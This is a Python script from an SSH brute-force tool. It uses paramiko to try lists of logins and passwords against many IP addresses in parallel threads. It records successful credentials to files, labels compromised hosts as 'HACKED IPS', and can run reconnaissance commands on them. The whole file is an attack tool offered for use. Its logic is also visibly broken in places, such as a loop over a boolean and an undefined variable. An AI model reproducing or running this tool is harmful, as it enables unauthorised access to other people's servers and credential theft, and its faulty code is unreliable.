from scripts.helpers import Threads, get_good_ips, prepare
from termcolor import colored
import paramiko
import os

ENV: dict
LOGINS: list
PASSWORDS: list

threads: Threads
current_work_ips: list
current_creds: list
worked_ips: list
good_ips: list

def execute(client: paramiko.SSHClient, command: str):
    return client.exec_command(command)

def make_connection(ip: str, number: int):
    global current_creds, worked_ips, good_ips
    state = True
    for login in LOGINS and state:
        if state:
            for password in PASSWORDS:
                if state:
                    current_creds[number] = [login, password]
                    
                    os.system('clear')
                    print('[SCAN] SCRIPT UNDER WORKING...')
                    print("CURRENT IPS UNDER TESTING:")
                    for j in range(len(current_work_ips)):
                        print(current_work_ips[j], '-->', f'{current_creds[j][0]}:{current_creds[j][1]}')
                    print(f'\n-----\n\nCHECKED IPS: {worked_ips}')
                    print(f'\n-----\n\nHACKED IPS: {good_ips}')
                    
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        client.connect(
                            hostname=ip,
                            port=22,
                            username=login,
                            password=password,
                            timeout=5
                        )
                    except Exception as error:
                        with open('errors.txt', 'a') as errors:
                            errors.write(str(error) + '\n')
                    else:
                        with open('found.txt', 'a') as found:
                            found.write(ip + f' | {login}:{password}\n')
                        
                        if ENV['ALLOW_COMMANDS']:
                            stdin1, stdout1, stderr1 = execute(client, 'hostname')
                            stdin2, stdout2, stderr2 = execute(client, 'ip a')
                        else:
                            stdin1, stdout1, stderr1 = '-', '-', '-'
                            stdin2, stdout2, stderr2 = '-', '-', '-'

                        with open('found-extended.txt', 'a') as founde:
                            founde.write(f'{stdout1.read().decode()}{ip}\n')
                            founde.write(f'{stdout1.read().decode()}\n{stdout2.read().decode()}\n-----\n')
                        
                        good_ips.append(ip)

                        state = False
                        
                        break
                        
                    client.close()
    worked_ips.append(ip)

def connect(ips: list, number: int):
    global current_work_ips
    for ip in ips:
        if type(ip) == list:
            for one_ip in ip:
                current_work_ips[number] = one_ip
                make_connection(one_ip, number)
        else:
            current_work_ips[number] = ip
            make_connection(one_ip, number)

def start(env, arguments):
    global ENV, LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips
    LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips = prepare()
    ENV = env
    print('PREPARED TO WORK')
    print('CREATING IPS LIST')
    ips = get_good_ips()
    print(colored('[INFO] IPS LIST IS READY', 'green'))
    print(colored('[INFO] STARTING CONNECTIONS...', 'green'))
    print(colored('[INFO] PREPARED TO WORK', 'green'))
    print(colored('[INFO] CREATING IPS LIST', 'green'))
    print(colored('[INFO] IPS LIST IS READY', 'green'))
    print(colored('[INFO] STARTING CONNECTIONS...', 'green'))
    
    start: int = 0
    part: int = len(ips) // ENV["THREADS"]
    end: int = part + ENV["THREADS"] - 1
    for i in range(ENV['THREADS']):
        # logger.info(start, end)
        threads.jobs.append([connect, [ips[start:end]], i])
        start, end = end, end + part
    
    threads.run()
    
    print(colored('CONNECTIONS ARE ENDED', 'green'))
    print(colored('MAKING BACKUPS', 'green'))
    os.system('cp found.txt found.txt.backup')
    os.system('cp found-extended.txt found-extended.txt.backup')
    os.system('cp errors.txt errors.txt.backup')

if __name__ == '__main__':
    print(colored('[WARNING] PLEASE LAUNCH ssh_brute.py', 'red'))
